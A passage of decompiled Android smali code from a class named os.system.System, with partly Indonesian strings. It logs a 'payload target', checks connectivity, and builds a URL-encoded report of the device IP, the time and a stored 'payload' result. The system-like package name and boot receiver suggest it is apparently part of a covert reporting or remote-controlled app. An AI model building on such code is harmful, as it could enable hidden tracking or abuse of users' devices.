    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 572
    :cond_2
    const-string v1, "target"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload target : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/System;->payloadWebResultTarget:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 579
    :cond_3
    :try_start_1
    sget-object v0, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "cekConnection:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 581
    :catch_0
    move-exception v0

    .line 582
    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "errRequest: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 583
    iget-object v0, p0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sput-boolean v4, Los/system/ReceiverBoot;->pingResult:Z

    goto/16 :goto_1
.end method

.method public textPayload(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    .prologue
    const/4 v4, 0x1

    const/4 v5, 0x0

    .line 543
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "HH:mm:ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    .line 544
    new-array v1, v4, [Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " [dari : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {v4}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "] [waktu : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "] [input : "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "]\n"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v1, v5

    .line 546
    const-string v0, "UTF-16"

    .line 548
    iget-object v2, p0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    const-string v3, "utf"

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, ""

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 549
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    const-string v3, "utf kosong"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 556
    :goto_0
    :try_start_0
    array-length v2, v1

    const/4 v3, 0x0

    if-ge v5, v2, :cond_1

    aget-object v1, v1, v3

    .line 558
    invoke-static {v1, v0}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 562
    :goto_1
    return-object v0

    .line 551
    :cond_0
    iget-object v0, p0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    const-string v2, "utf"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 552
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "utf:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 561
    :catch_0
    move-exception v0

    .line 562
    :cond_1
    const/4 v0, 0x0

    goto :goto_1
.end method
